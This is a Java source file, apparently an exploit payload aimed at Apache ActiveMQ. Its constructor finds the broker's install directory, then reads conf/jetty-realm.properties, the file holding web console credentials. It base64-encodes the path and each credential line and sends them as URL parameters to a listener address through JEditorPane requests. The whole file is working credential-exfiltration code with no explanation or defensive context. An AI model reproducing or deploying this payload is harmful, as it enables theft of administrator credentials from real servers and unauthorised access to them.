package exp;


import java.io.BufferedReader;
import java.io.FileReader;
import javax.swing.JEditorPane;


public class ActivemqReadFile{
	public String url ;
	public String jsp ;
	public String webshell;
    
    public void setAll()  {
    	this.url = "http://127.0.0.1:8000/";
    }
	
    public ActivemqReadFile() throws Exception {
    	setAll();
    	//this.url = "http://127.0.0.1:8000/";
    	String dir = System.getProperty("user.dir");
    	if(dir.contains("bin")) {
    		if(dir.contains("linux") || dir.contains("win")) {
    			dir = dir+"/../../";
    		} else {
    			dir = dir+"/../";
			}
    	}
    	String base64dir = base64_encode(dir.getBytes());
    	new JEditorPane().setPage(url+"?dir="+base64dir);
    	
        BufferedReader reader;
        reader = new BufferedReader(new FileReader(dir+"/conf/jetty-realm.properties"));
        
        String line = reader.readLine();
        while (line != null) {
        	if(!line.contains("#") && !line.equals("")) {
        		line = base64_encode(line.getBytes());
        		new JEditorPane().setPage(url+"?user="+line);
        	}
        	line = reader.readLine();
        }
        reader.close();
    }

    public static String base64_encode(byte[] bs) throws Exception {
    	String base64;
        try {
       	 base64 = (String) Class.forName("sun.misc.BASE64Encoder").getMethod("encodeBuffer",byte[].class).invoke(Class.forName("sun.misc.BASE64Encoder").newInstance(), bs);
		} catch (Exception e) {
			Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
			base64 = (String) Class.forName("java.util.Base64$Encoder").getMethod("encodeToString",byte[].class).invoke(encoder, bs);
		}
        return base64.replace("\r\n", "");
       
	}
}
